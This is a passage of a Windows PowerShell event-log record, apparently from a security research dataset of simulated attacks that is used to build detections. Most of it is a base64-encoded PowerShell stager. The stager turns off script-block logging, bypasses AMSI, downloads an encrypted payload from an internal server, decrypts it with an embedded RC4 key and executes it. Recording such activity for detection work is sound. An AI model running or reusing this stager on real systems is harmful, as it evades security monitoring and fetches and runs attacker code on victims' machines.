cgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 14fec114-9ecd-42a9-9fe7-148387e88b78\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28362\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
